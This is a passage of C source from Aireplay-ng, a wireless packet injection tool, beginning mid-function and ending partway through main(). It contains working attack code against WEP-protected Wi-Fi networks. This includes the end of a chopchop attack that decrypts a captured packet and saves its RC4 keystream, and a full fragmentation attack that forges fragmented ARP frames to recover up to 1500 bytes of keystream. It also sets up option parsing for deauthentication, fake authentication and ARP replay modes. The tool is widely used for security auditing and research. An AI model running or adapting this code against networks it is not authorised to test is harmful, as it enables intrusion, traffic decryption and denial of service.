        chopped[data_end - 3] ^= crc_chop_tbl[guess][2];
        chopped[data_end - 4] ^= crc_chop_tbl[guess][1];
        chopped[data_end - 5] ^= crc_chop_tbl[guess][0];

        n = caplen - data_start;

        printf( "\rOffset %4d (%2d%% done) | xor = %02X | pt = %02X | "
                "%4ld frames written in %5.0fms\n", data_end - 1,
                100 * ( caplen - data_end ) / n,
                chopped[data_end - 1],
                chopped[data_end - 1] ^ srcbuf[data_end - 1],
                nb_pkt_sent, ticks[3] );

        if( is_deauth_mode )
        {
            opt.r_smac[1] = rand() & 0x3E;
            opt.r_smac[2] = rand() & 0xFF;
            opt.r_smac[3] = rand() & 0xFF;
            opt.r_smac[4] = rand() & 0xFF;
        }
        else
        {
            opt.r_dmac[1] = rand() & 0xFE;
            opt.r_dmac[2] = rand() & 0xFF;
            opt.r_dmac[3] = rand() & 0xFF;
            opt.r_dmac[4] = rand() & 0xFF;
        }

        ticks[3]        = 0;
        nb_pkt_sent     = 0;
        nb_bad_pkt      = 0;
        guess           = 256;

        data_end--;

        alarm( 0 );
    }

    /* reveal the plaintext (chopped contains the prga) */

    memcpy( h80211, srcbuf, caplen );

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;

    chopped[z + 4] = srcbuf[z + 4] ^ b1;
    chopped[z + 5] = srcbuf[z + 5] ^ b2;
    chopped[z + 6] = srcbuf[z + 6] ^ 0x03;
    chopped[z + 7] = srcbuf[z + 7] ^ 0x00;
    chopped[z + 8] = srcbuf[z + 8] ^ 0x00;
    chopped[z + 9] = srcbuf[z + 9] ^ 0x00;

    for( i = z + 4; i < (int) caplen; i++ )
        h80211[i - 4] = h80211[i] ^ chopped[i];

    if( ! check_crc_buf( h80211 + z, caplen - z - 8 ) )
        printf( "\nWarning: ICV checksum verification FAILED!\n" );

    caplen -= 4 + 4; /* remove the WEP IV & CRC (ICV) */

    h80211[1] &= 0xBF;   /* remove the WEP bit, too */

    /* save the decrypted packet */

    gettimeofday( &tv, NULL );

    pfh_out.magic         = TCPDUMP_MAGIC;
    pfh_out.version_major = PCAP_VERSION_MAJOR;
    pfh_out.version_minor = PCAP_VERSION_MINOR;
    pfh_out.thiszone      = 0;
    pfh_out.sigfigs       = 0;
    pfh_out.snaplen       = 65535;
    pfh_out.linktype      = LINKTYPE_IEEE802_11;

    pkh.tv_sec  = tv.tv_sec;
    pkh.tv_usec = tv.tv_usec;
    pkh.caplen  = caplen;
    pkh.len     = caplen;

    lt = localtime( &tv.tv_sec );

    memset( strbuf, 0, sizeof( strbuf ) );
    snprintf( strbuf,  sizeof( strbuf ) - 1,
              "replay_dec-%02d%02d-%02d%02d%02d.cap",
              lt->tm_mon + 1, lt->tm_mday,
              lt->tm_hour, lt->tm_min, lt->tm_sec );

    printf( "\nSaving plaintext in %s\n", strbuf );

    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        return( 1 );
    }

    n = sizeof( struct pcap_file_header );

    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed\n" );
        return( 1 );
    }

    n = sizeof( pkh );

    if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    n = pkh.caplen;

    if( fwrite( h80211, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    fclose( f_cap_out );

    /* save the RC4 stream (xor mask) */

    memset( strbuf, 0, sizeof( strbuf ) );
    snprintf( strbuf,  sizeof( strbuf ) - 1,
              "replay_dec-%02d%02d-%02d%02d%02d.xor",
              lt->tm_mon + 1, lt->tm_mday,
              lt->tm_hour, lt->tm_min, lt->tm_sec );

    printf( "Saving keystream in %s\n", strbuf );

    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        return( 1 );
    }

    n = pkh.caplen + 8 - z;

    if( fwrite( chopped + z, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    fclose( f_cap_out );

    printf( "\nCompleted in %lds (%0.2f bytes/s)\n\n",
            time( NULL ) - tt,
            (float) ( pkh.caplen - 6 - z ) /
            (float) ( time( NULL ) - tt  ) );

    return( 0 );
}

int make_arp_request(uchar *h80211, uchar *bssid, uchar *src_mac, uchar *dst_mac, uchar *src_ip, uchar *dst_ip, int size)
{
    // 802.11 part
    uchar *header80211 = (unsigned char*)"\x08\x41\x95\x00";
    memcpy(h80211,    header80211, 4);
    memcpy(h80211+4,  bssid,       6);
    memcpy(h80211+10, src_mac,     6);
    memcpy(h80211+16, dst_mac,     6);
    h80211[22] = '\x00';
    h80211[23] = '\x00';

    // ARP part
    uchar *arp_header = (unsigned char*)"\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01";
    memcpy(h80211+24, arp_header, 16);
    memcpy(h80211+40, src_mac,     6);
    memcpy(h80211+46, src_ip,      4);
    memset(h80211+50, '\x00',      6);
    memcpy(h80211+56, dst_ip,      4);

    // Insert padding bytes
    memset(h80211+60, '\x00', size-60);

    return 0;
}

void send_fragments(uchar *packet, int packet_len, uchar *iv, uchar *keystream, int fragsize)
{
    int t, u;
    int data_size = packet_len - 24;
    uchar frag[30+fragsize];
    int pack_size;

    packet[23] = (rand() % 0xFF);

    for (t=0; t+=fragsize;)
    {

    //Copy header
        memcpy(frag, packet, 24);

    //Copy IV + KeyIndex
        memcpy(frag+24, iv, 4);

    //Copy data
        memcpy(frag+28, packet+24+t-fragsize, fragsize);

    //Make ToDS frame
        frag[1] |= 1;
        frag[1] &= 253;

    //Set fragment bit
        if (t< data_size) frag[1] |= 4;
        if (t==data_size) frag[1] &= 251;

    //Fragment number
        frag[22] = 0;
        for (u=t; u-=fragsize;)
        {
            frag[22] += 1;
        }
//        frag[23] = 0;

    //Calculate packet lenght
        pack_size = 28 + fragsize;

    //Add ICV
        add_icv(frag, pack_size, 28);
        pack_size += 4;

    //Encrypt
        xor_keystream(frag+28, keystream, fragsize+4);

    //Send
        send_packet(frag, pack_size);
        if (t<data_size)usleep(10);

        if (t>=data_size) break;
    }

}

void save_prga(char *filename, uchar *iv, uchar *prga, int prgalen)
{
    FILE *xorfile;
    xorfile = fopen(filename, "wb");
    fwrite (iv, 1, 4, xorfile);
    fwrite (prga, 1, prgalen, xorfile);
    fclose (xorfile);
}

int do_attack_fragment()
{
    uchar packet[4096];
    uchar packet2[4096];
    uchar prga[4096];
    uchar *snap_header = (unsigned char*)"\xAA\xAA\x03\x00\x00\x00\x08\x00";
    uchar iv[4];
//    uchar ack[14] = "\xd4";

    char strbuf[256];

    struct tm *lt;
    struct timeval tv, tv2;

    int done     = 0;
    int caplen   = 0;
    int caplen2  = 0;
    int arplen   = 0;
    int round    = 0;
    int prga_len = 0;
    int isrelay  = 0;
    int gotit    = 0;
    int again    = 0;
    int length   = 0;


    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a BSSID (-b).\n" );
        return( 1 );
    }

    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a source MAC (-h).\n" );
        return( 1 );
    }

    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
    {
        memset( opt.r_dmac, '\xFF', 6);
        opt.r_dmac[5] = 0xED;
    }

    if( memcmp( opt.r_sip, NULL_MAC, 4 ) == 0 )
    {
        memset( opt.r_sip, '\xFF', 4);
    }

    if( memcmp( opt.r_dip, NULL_MAC, 4 ) == 0 )
    {
        memset( opt.r_dip, '\xFF', 4);
    }

    printf ("Waiting for a data packet...\n");

    while(!done)  //
    {
        round = 0;

        if( capture_ask_packet( &caplen ) != 0 )
            return -1;

        memcpy( packet2, h80211, caplen );
        caplen2 = caplen;
        printf("Data packet found!\n");

        if ( memcmp( packet2 +  4, SPANTREE, 6 ) == 0 ||
             memcmp( packet2 + 16, SPANTREE, 6 ) == 0 )
        {
            packet2[28] = ((packet2[28] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
            packet2[29] = ((packet2[29] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
            packet2[34] = ((packet2[34] ^ 0x00) ^ 0x08);  //0x00 instead of 0x08
        }

        prga_len = 7;

        again = RETRY;

        memcpy( packet, packet2, caplen2 );
        caplen = caplen2;
        memcpy(prga, packet+28, prga_len);
        memcpy(iv, packet+24, 4);

        xor_keystream(prga, snap_header, prga_len);

        while(again == RETRY)  //sending 7byte fragments
        {
            again = 0;

            arplen=60;
            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);

            if ((round % 2) == 1)
            {
                printf("Trying a LLC NULL packet\n");
                memset(h80211+24, '\x00', 39);
                arplen=63;
            }

            printf("Sending fragmented packet\n");
            send_fragments(h80211, arplen, iv, prga, prga_len-4);
//            //Plus an ACK
//            send_packet(ack, 10);

            gettimeofday( &tv, NULL );


            while (!gotit)  //waiting for relayed packet
            {
                caplen = read_packet(packet, 4096);

                if (packet[0] == 0x08 && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                {
                    if ( (packet[1] & 2) && (packet[27] <= 0x03) )  //Is a FromDS packet with valid IV
                    {
                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
                        {
                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                            {
                                if (caplen < 90)  //Is short enough
                                {
                                    //This is our relayed packet!
                                    printf("Got RELAYED packet!!\n");
                                    gotit = 1;
                                    isrelay = 1;
                                }
                            }
                        }

/*                        if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
                        {
                            if (caplen < 90) //Is short enough
                            {
                                //This is an answer to our packet!
                                printf("Got ANSWER packet!!\n");
                                gotit = 1;
                                isrelay = 0;
                            }
                        } */
                    }
                }

                /* check if we got an deauthentication packet */

                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    printf( "Got a deauthentication packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                /* check if we got an disassociation packet */

                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    printf( "Got a disassociation packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                gettimeofday( &tv2, NULL );
                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 500ms for an answer
                {
                    printf("No answer, repeating...\n");
                    round++;
                    again = RETRY;
                    if (round > 10)
                    {
                        printf("Still nothing, trying another packet...\n");
                        again = NEW_IV;
                    }
                    break;
                }
            }
        }

        if(again == NEW_IV) continue;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);
        if (caplen == 68)
        {
            //Thats the ARP packet!
            printf("Thats our ARP packet!\n");
        }
        if (caplen == 71)
        {
            //Thats the LLC NULL packet!
            printf("Thats our LLC Null packet!\n");
            memset(h80211+24, '\x00', 39);
        }

        if (! isrelay)
        {
            //Building expected cleartext
            uchar ct[4096] = "\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02";
            //Ethernet & ARP header

            //Followed by the senders MAC and IP:
            memcpy(ct+16, packet+16, 6);
            memcpy(ct+22, opt.r_dip,  4);

            //And our own MAC and IP:
            memcpy(ct+26, opt.r_smac,   6);
            memcpy(ct+32, opt.r_sip,   4);

            //Calculating
            memcpy(prga, packet+28, 36);
            xor_keystream(prga, ct, 36);
        }
        else
        {
            memcpy(prga, packet+28, 36);
            xor_keystream(prga, h80211+24, 36);
        }

        memcpy(iv, packet+24, 4);
        round = 0;
        again = RETRY;
        while(again == RETRY)
        {
            again = 0;

            printf("Trying to get 384 bytes of a keystream\n");

            arplen=408;

            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);
            if ((round % 2) == 1)
            {
                printf("Trying a LLC NULL packet\n");
                memset(h80211+24, '\x00', arplen+8);
                arplen+=32;
            }

            send_fragments(h80211, arplen, iv, prga, 32);
//            //Plus an ACK
//            send_packet(ack, 10);

            gettimeofday( &tv, NULL );

            gotit=0;
            while (!gotit)  //waiting for relayed packet
            {
                caplen = read_packet(packet, 4096);

                if (packet[0] == 0x08 && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                {
                    if ( (packet[1] & 2) && (packet[27] <= 3) )  //Is a FromDS packet with valid IV
                    {
                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
                        {
                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                            {
                                if (caplen > 400 && caplen < 500)  //Is short enough
                                {
                                    //This is our relayed packet!
                                    printf("Got RELAYED packet!!\n");
                                    gotit = 1;
                                    isrelay = 1;
                                }
                            }
                        }
                    }
                }

                /* check if we got an deauthentication packet */

                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    printf( "Got a deauthentication packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                /* check if we got an disassociation packet */

                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    printf( "Got a disassociation packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                gettimeofday( &tv2, NULL );
                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 500ms for an answer
                {
                    printf("No answer, repeating...\n");
                    round++;
                    again = RETRY;
                    if (round > 10)
                    {
                        printf("Still nothing, trying another packet...\n");
                        again = NEW_IV;
                    }
                    break;
                }
            }
        }

        if(again == NEW_IV) continue;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 408);
        if (caplen == 416)
        {
            //Thats the ARP packet!
            printf("Thats our ARP packet!\n");
        }
        if (caplen == 448)
        {
            //Thats the LLC NULL packet!
            printf("Thats our LLC Null packet!\n");
            memset(h80211+24, '\x00', 416);
        }

        memcpy(iv, packet+24, 4);
        memcpy(prga, packet+28, 384);
        xor_keystream(prga, h80211+24, 384);

        round = 0;
        again = RETRY;
        while(again == RETRY)
        {
            again = 0;

            printf("Trying to get 1500 bytes of a keystream\n");

            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 1500);
            arplen=1500;
            if ((round % 2) == 1)
            {
                printf("Trying a LLC NULL packet\n");
                memset(h80211+24, '\x00', 1508);
                arplen+=32;
            }

            send_fragments(h80211, arplen, iv, prga, 300);
//            //Plus an ACK
//            send_packet(ack, 10);

            gettimeofday( &tv, NULL );

            gotit=0;
            while (!gotit)  //waiting for relayed packet
            {
                caplen = read_packet(packet, 4096);

                if (packet[0] == 0x08 && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                {
                    if ( (packet[1] & 2) && (packet[27] <= 3) )  //Is a FromDS packet with valid IV
                    {
                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
                        {
                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                            {
                                if (caplen > 1496)  //Is short enough
                                {
                                    //This is our relayed packet!
                                    printf("Got RELAYED packet!!\n");
                                    gotit = 1;
                                    isrelay = 1;
                                }
                            }
                        }
                    }
                }

                /* check if we got an deauthentication packet */

                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    printf( "Got a deauthentication packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                /* check if we got an disassociation packet */

                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    printf( "Got a disassociation packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                gettimeofday( &tv2, NULL );
                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 500ms for an answer
                {
                    printf("No answer, repeating...\n");
                    round++;
                    again = RETRY;
                    if (round > 10)
                    {
                        printf("Still nothing, quitting with 384 bytes? [y/n] \n");
                        fflush( stdout );
                        scanf( "%s", tmpbuf );
                        printf( "\n" );

                        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )
                            again = ABORT;
                        else
                            again = NEW_IV;
                    }
                    break;
                }
            }
        }

        if(again == NEW_IV) continue;

        if(again == ABORT) length = 408;
        else length = 1500;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, length);
        if (caplen == length+8+24)
        {
            //Thats the ARP packet!
            printf("Thats our ARP packet!\n");
        }
        if (caplen == length+40)
        {
            //Thats the LLC NULL packet!
            printf("Thats our LLC Null packet!\n");
            memset(h80211+24, '\x00', length+8);
        }

        memcpy(iv, packet+24, 4);
        memcpy(prga, packet+28, length);
        xor_keystream(prga, h80211+24, length);


        lt = localtime(&tv.tv_sec);
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "fragment-%02d%02d-%02d%02d%02d.xor",
                  lt->tm_mon + 1, lt->tm_mday,
                  lt->tm_hour, lt->tm_min, lt->tm_sec );
        save_prga(strbuf, iv, prga, length+24);

        printf( "Saving keystream in %s\n", strbuf );
        printf("Now you can build a packet with packetforge-ng out of that %d bytes keystream\n", length);

        done=1;

    }

    return( 0 );
}


int sysfs_inject=0;
int opensysfs( char *iface, int fd) {
    int fd2;
    char buf[256];

    snprintf(buf, 256, "/sys/class/net/%s/device/inject", iface);
    fd2 = open(buf, O_WRONLY);
    if (fd2 == -1)
        return -1;

    dup2(fd2, fd);
    close(fd2);

    sysfs_inject=1;
    return 0;
}

/* interface initialization routine */

int openraw( char *iface, int fd, int *arptype, uchar* mac )
{
    struct ifreq ifr;
    struct packet_mreq mr;
    struct sockaddr_ll sll;

    /* find the interface index */

    memset( &ifr, 0, sizeof( ifr ) );
    strncpy( ifr.ifr_name, iface, sizeof( ifr.ifr_name ) - 1 );

    if( ioctl( fd, SIOCGIFINDEX, &ifr ) < 0 )
    {
        perror( "ioctl(SIOCGIFINDEX) failed" );
        return( 1 );
    }

    /* bind the raw socket to the interface */

    memset( &sll, 0, sizeof( sll ) );
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;

    if( dev.is_wlanng )
        sll.sll_protocol = htons( ETH_P_80211_RAW );
    else
        sll.sll_protocol = htons( ETH_P_ALL );

    if( bind( fd, (struct sockaddr *) &sll,
              sizeof( sll ) ) < 0 )
    {
        perror( "bind(ETH_P_ALL) failed" );
        return( 1 );
    }

    /* lookup the hardware type */

    if( ioctl( fd, SIOCGIFHWADDR, &ifr ) < 0 )
    {
        perror( "ioctl(SIOCGIFHWADDR) failed" );
        return( 1 );
    }

    memcpy( mac, (unsigned char*)ifr.ifr_hwaddr.sa_data, 6);

    if( ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211 &&
        ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_PRISM &&
        ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_FULL )
    {
		/* try sysfs instead (ipw2200) */
		if (opensysfs(iface, fd) == 0)
            return 0;

        if( ifr.ifr_hwaddr.sa_family == 1 )
            fprintf( stderr, "\nARP linktype is set to 1 (Ethernet) " );
        else
            fprintf( stderr, "\nUnsupported hardware link type %4d ",
                     ifr.ifr_hwaddr.sa_family );

        fprintf( stderr, "- expected ARPHRD_IEEE80211\nor ARPHRD_IEEE8021"
                         "1_PRISM instead.  Make sure RFMON is enabled:\n"
                         "run 'ifconfig %s up; iwconfig %s mode Monitor "
                         "channel <#>'\nSysfs injection support was not "
                         "found either.\n\n", iface, iface );
        return( 1 );
    }

    *arptype = ifr.ifr_hwaddr.sa_family;

    /* enable promiscuous mode */

    memset( &mr, 0, sizeof( mr ) );
    mr.mr_ifindex = sll.sll_ifindex;
    mr.mr_type    = PACKET_MR_PROMISC;

    if( setsockopt( fd, SOL_PACKET, PACKET_ADD_MEMBERSHIP,
                    &mr, sizeof( mr ) ) < 0 )
    {
        perror( "setsockopt(PACKET_MR_PROMISC) failed" );
        return( 1 );
    }

    return( 0 );
}

char athXraw[] = "athXraw";

int main( int argc, char *argv[] )
{
    int n;
    FILE * f;
    /* check the arguments */

    memset( &opt, 0, sizeof( opt ) );
    memset( &dev, 0, sizeof( dev ) );

    opt.f_type    = -1; opt.f_subtype   = -1;
    opt.f_minlen  = -1; opt.f_maxlen    = -1;
    opt.f_tods    = -1; opt.f_fromds    = -1;
    opt.f_iswep   = -1; opt.ringbuffer  =  8;

    opt.a_mode    = -1; opt.r_fctrl     = -1;
    opt.ghost     =  0; opt.npackets    = -1;
    opt.delay     = 15;

    while( 1 )
    {
        int option_index = 0;

        static struct option long_options[] = {
            {"deauth",      1, 0, '0'},
            {"fakeauth",    1, 0, '1'},
            {"interactive", 0, 0, '2'},
            {"arpreplay",   0, 0, '3'},
            {"chopchop",    0, 0, '4'},
            {"fragment",    0, 0, '5'},
            {0,             0, 0,  0 }
        };

        int option = getopt_long( argc, argv,
                        "b:d:s:m:n:u:v:t:f:g:w:x:p:a:c:h:e:ji:r:k:l:y:o:q:0:1:2345",
                        long_options, &option_index );

        if( option < 0 ) break;

        switch( option )
        {
            case 0 :

                break;

            case 'b' :

                if( getmac( optarg, 1 ,opt.f_bssid ) != 0 )
                {
                    printf( "Invalid BSSID (AP MAC address).\n" );
                    return( 1 );
                }
                break;

            case 'd' :

                if( getmac( optarg, 1, opt.f_dmac ) != 0 )
                {
                    printf( "Invalid destination MAC address.\n" );
                    return( 1 );
                }
                break;

            case 's' :

                if( getmac( optarg, 1, opt.f_smac ) != 0 )
                {
                    printf( "Invalid source MAC address.\n" );
                    return( 1 );
                }
                break;

            case 'm' :

                sscanf( optarg, "%d", &opt.f_minlen );
                if( opt.f_minlen < 0 )
                {
                    printf( "Invalid minimum length filter.\n" );
                    return( 1 );
                }
                break;

            case 'n' :

                sscanf( optarg, "%d", &opt.f_maxlen );
                if( opt.f_maxlen < 0 )
                {
                    printf( "Invalid maximum length filter.\n" );
                    return( 1 );
                }
                break;

            case 'u' :

                sscanf( optarg, "%d", &opt.f_type );
                if( opt.f_type < 0 || opt.f_type > 3 )
                {
                    printf( "Invalid type filter.\n" );
                    return( 1 );
                }
                break;

            case 'v' :

                sscanf( optarg, "%d", &opt.f_subtype );
                if( opt.f_subtype < 0 || opt.f_subtype > 15 )
                {
                    printf( "Invalid subtype filter.\n" );
                    return( 1 );
                }
                break;

            case 't' :

                sscanf( optarg, "%d", &opt.f_tods );
                if( opt.f_tods != 0 && opt.f_tods != 1 )
                {
                    printf( "Invalid tods filter.\n" );
                    return( 1 );
                }
                break;

            case 'f' :

                sscanf( optarg, "%d", &opt.f_fromds );
                if( opt.f_fromds != 0 && opt.f_fromds != 1 )
                {
                    printf( "Invalid fromds filter.\n" );
                    return( 1 );
                }
                break;

            case 'w' :

                sscanf( optarg, "%d", &opt.f_iswep );
                if( opt.f_iswep != 0 && opt.f_iswep != 1 )
                {
                    printf( "Invalid wep filter.\n" );
                    return( 1 );
                }
                break;

            case 'x' :

                sscanf( optarg, "%d", &opt.r_nbpps );
                if( opt.r_nbpps < 1 || opt.r_nbpps > 1024 )
                {
                    printf( "Invalid number of packets per second.\n" );
                    return( 1 );
                }
                break;

            case 'o' :

                sscanf( optarg, "%d", &opt.npackets );
                if( opt.npackets < 1 || opt.npackets > 512 )
                {
                    printf( "Invalid number of packets per burst.\n" );
                    return( 1 );
                }
                break;

            case 'q' :

                sscanf( optarg, "%d", &opt.delay );
                if( opt.delay < 1 || opt.delay > 600 )
                {
                    printf( "Invalid number of seconds.\n" );
                    return( 1 );
                }
                break;

            case 'p' :

                sscanf( optarg, "%x", &opt.r_fctrl );
                if( opt.r_fctrl < 0 || opt.r_fctrl > 65355 )
                {
                    printf( "Invalid frame control word.\n" );
                    return( 1 );
                }
                break;

            case 'a' :

                if( getmac( optarg, 1, opt.r_bssid ) != 0 )
                {
                    printf( "Invalid AP MAC address.\n" );
                    return( 1 );
                }
                break;

            case 'c' :

                if( getmac( optarg, 1, opt.r_dmac ) != 0 )
                {
                    printf( "Invalid destination MAC address.\n" );
                    return( 1 );
                }
                break;

            case 'g' :

                if( sscanf( optarg, "%d", &opt.ringbuffer ) != 1 ||
                    opt.ringbuffer < 1 )
                {
                    printf( "Invalid replay ring buffer size.\n");
                    return( 1 );
                }
                break;

            case 'h' :

                if( getmac( optarg, 1, opt.r_smac ) != 0 )
                {
                    printf( "Invalid source MAC address.\n" );
                    return( 1 );
                }
                break;

            case 'e' :

                memset(  opt.r_essid, 0, sizeof( opt.r_essid ) );
                strncpy( opt.r_essid, optarg, sizeof( opt.r_essid ) - 1 );
                break;

            case 'j' :

                opt.r_fromdsinj = 1;
                break;

            case 'k' :

                inet_aton( optarg, (struct in_addr *) opt.r_dip );
                break;

            case 'l' :

                inet_aton( optarg, (struct in_addr *) opt.r_sip );
                break;

            case 'y' :

                if( opt.prga != NULL )
                {
                    printf( "PRGA file already specified.\n" );
                    return( 1 );
                }
                if( read_prga(&(opt.prga), optarg) != 0 )
                {
                    return( 1 );
                }
                break;

            case 'i' :

                if( opt.s_face != NULL || opt.s_file )
                {
                    printf( "Packet source already specified.\n" );
                    return( 1 );
                }
                opt.s_face = optarg;
                break;

            case 'r' :

                if( opt.s_face != NULL || opt.s_file )
                {
                    printf( "Packet source already specified.\n" );
                    return( 1 );
                }
                opt.s_file = optarg;
                break;

			case 'z' :

				opt.ghost = 1;

				break;

            case '0' :

                if( opt.a_mode != -1 )
                {
                    printf( "Attack mode already specified.\n" );
                    return( 1 );
                }
                opt.a_mode = 0;

                sscanf( optarg, "%d", &opt.a_count );
                if( opt.a_count < 0 )
                {
                    printf( "Invalid deauthentication count.\n" );
                    return( 1 );
                }
                break;

            case '1' :

                if( opt.a_mode != -1 )
                {
                    printf( "Attack mode already specified.\n" );
                    return( 1 );
                }
                opt.a_mode = 1;

                sscanf( optarg, "%d", &opt.a_delay );
                if( opt.a_delay < 0 )
                {
                    printf( "Invalid reauthentication delay.\n" );
                    return( 1 );
                }
                break;

            case '2' :

                if( opt.a_mode != -1 )
                {
                    printf( "Attack mode already specified.\n" );
                    return( 1 );
                }
                opt.a_mode = 2;
                break;

            case '3' :

                if( opt.a_mode != -1 )
                {
                    printf( "Attack mode already specified.\n" );
                    return( 1 );
                }
                opt.a_mode = 3;
                break;

            case '4' :

                if( opt.a_mode != -1 )
                {
                    printf( "Attack mode already specified.\n" );
                    return( 1 );
                }
                opt.a_mode = 4;
                break;

            case '5' :

                if( opt.a_mode != -1 )
                {
                    printf( "Attack mode already specified.\n" );
                    return( 1 );
                }
                opt.a_mode = 5;
                break;

            default : goto usage;
        }
    }

    if( argc - optind < 1 || argc - optind > 2 )
    {
    usage:
        printf( usage, getVersion("Aireplay-ng", _MAJ, _MIN, _SUB_MIN, _REVISION)  );
        return( 1 );
    }

    if( opt.a_mode == -1 )
    {
        printf( "Please specify an attack mode.\n" );
        return( 1 );
    }

    if( opt.f_minlen > opt.f_maxlen )
    {
        printf( "Invalid length filter (%d > %d).\n",
                opt.f_minlen, opt.f_maxlen );
        return( 1 );
    }

    if( geteuid() != 0 )
    {
        printf( "This program requires root privileges.\n" );
        return( 1 );
    }

	if ( opt.f_tods == 1 && opt.f_fromds == 1 )
	{
		printf( "FromDS and ToDS bit are set: packet has to come from the AP and go to the AP\n" );
	}
	
    dev.fd_rtc = -1;

    /* open the RTC device if necessary */

#ifdef __i386__
    if( opt.a_mode > 1 )
    {
        if( ( dev.fd_rtc = open( "/dev/rtc", O_RDONLY ) ) < 0 )
        {
            perror( "open(/dev/rtc) failed" );
        }
        else
        {
            if( ioctl( dev.fd_rtc, RTC_IRQP_SET, 1024 ) < 0 )
            {
                perror( "ioctl(RTC_IRQP_SET) failed" );
                printf(
"Make sure enhanced rtc device support is enabled in the kernel (module\n"
"rtc, not genrtc) - also try 'echo 1024 >/proc/sys/dev/rtc/max-user-freq'.\n" );
                close( dev.fd_rtc );
                dev.fd_rtc = -1;
            }
            else
            {
                if( ioctl( dev.fd_rtc, RTC_PIE_ON, 0 ) < 0 )
                {
                    perror( "ioctl(RTC_PIE_ON) failed" );
                    close( dev.fd_rtc );
                    dev.fd_rtc = -1;
                }
            }
        }
    }
#endif

    /* create the RAW sockets */

    if( ( dev.fd_in = socket( PF_PACKET, SOCK_RAW,
                              htons( ETH_P_ALL ) ) ) < 0 )
    {
        perror( "socket(PF_PACKET) failed" );
        if( getuid() != 0 )
            fprintf( stderr, "This program requires root privileges.\n" );
        return( 1 );
    }

	/* Check iwpriv existence */

	iwpriv = wiToolsPath("iwpriv");

    if (! iwpriv )
	{
		fprintf(stderr, "Can't find wireless tools, exiting.\n");
		return (1);
	}

	/* Exit if ndiswrapper : check iwpriv ndis_reset */

	if ( is_ndiswrapper(argv[optind], iwpriv ) )
	{
		fprintf(stderr, "Ndiswrapper doesn't support monitor mode.\n");
		return (1);
	}

    if( ( dev.fd_out = socket( PF_PACKET, SOCK_RAW,
                               htons( ETH_P_ALL ) ) ) < 0 )
    {
        perror( "socket(PF_PACKET) failed" );
        return( 1 );
    }

    /* check if wlan-ng or hostap or r8180 */

    if( strlen( argv[optind] ) == 5 &&
        memcmp( argv[optind], "wlan", 4 ) == 0 )
    {
